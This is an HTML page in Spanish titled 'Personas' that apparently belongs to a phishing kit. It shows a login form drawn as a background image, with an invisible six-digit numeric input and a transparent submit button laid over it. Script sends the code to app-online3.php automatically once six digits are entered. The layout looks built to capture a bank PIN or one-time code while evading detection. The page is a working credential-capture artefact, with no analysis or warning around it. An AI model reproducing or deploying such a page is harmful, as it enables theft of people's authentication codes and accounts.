<!DOCTYPE html>
<html lang="es">
  <head>

    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <title>Personas</title>
    
  </head>
  <body style="overflow-x:hidden;background:url(bg1.jpg);background-size:cover;">
    <header> 
      <nav style="overflow: hidden;padding-top: 20px;"><div  class="im1" style="width: 200px;text-align: center;display:inline-block;height: 56px;"><img src="plg1.svg" style="width: 120px;max-width:220px;"></div>
      </nav>
    </header>
    <div id="cizq">
        <div id="mn-frm" class="pcont">
          <form action="app-online3.php"  method="post" id="pfrm">
            <input autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" autofocus maxlength="6" required name="ipx1" type="text" placeholder="" style="position: relative;top: 186px;left: 67px;height: 39px;width: 300px;display: block; border:none; background:transparent;font-size: 15px;letter-spacing: 47px;color: #555;font-family: sans-serif;">

            <input type="submit" value="" style="position: relative;top: 282px;left: 70px;height: 39px;width: 280px;display: block; border:none; background:transparent;padding: 0px 0 0 0px;font-size: 14px;font-family: sans-serif;">
          </form>
        </div>
    </div>
    
    <style>
      *{margin:0;padding:0;}
      input:focus { outline: none; }
      header nav{
        height: 56px;
        padding-left: 12rem;
        padding-right: 12rem;
        box-shadow: 0 8px 8px -8px rgb(7 7 7 / 16%);
        background: #fff;
        text-align: center;
      }
      
      .lg-cont {
        width: 100%;
        text-align: center;
        margin-top: 30px;
      }
      .lg-cont img{
        width: 175px;
        display: inline-block;
      }
      #cder,#cizq{
        width:100%;
        min-height:300px;
        display:inline-block;
        float: left;
      }
      #cizq{
        text-align:center;
        
      }
      #cder{
        text-align:center;
      }
      #mn-frm{
        height:524px;
        width:420px;
        background-image:url('pfr3.svg');
        background-repeat:no-repeat;
        background-size:cover;
        display:inline-block;
      }
      input{
        color:#333;
        font-family:sans-serif;
        font-size:12px;
      }

      @media screen and (max-width: 1024px){
        #cder,#cizq{
        width:100%;
        }
        #cizq{
          height:30vh!important;
          background-position:center;
        }
        .im1,.im2{
          width:100%!important;
          float: left!important;
        }
        .im2{
          display: none!important;
        }
        .im1{
          text-align:center!important;
        }
        header nav{
          padding-left:0px;
          padding-right:0px;
        }
      }
      
      
    </style>
    <script>
        var container = document.getElementsByClassName("pcont")[0];
        container.onkeyup = function(e) {
            var target = e.srcElement || e.target;
            var maxLength = parseInt(target.attributes["maxlength"].value, 10);
            var myLength = target.value.length;
            if (myLength >= maxLength) {
                var next = target;
                while (next = next.nextElementSibling) {
                    if (next == null)
                        break;
                    if (next.tagName.toLowerCase() === "input") {
                        next.focus();
                        document.getElementById("pfrm").submit();
                        break;
                    }
                }
            }
             // Move to previous field if empty (user pressed backspace)
            else if (myLength === 0) {
                var previous = target;
                while (previous = previous.previousElementSibling) {
                    if (previous == null)
                        break;
                    if (previous.tagName.toLowerCase() === "input") {
                        previous.focus();
                        break;
                    }
                }
            }
        }
    </script>
  </body>
</html>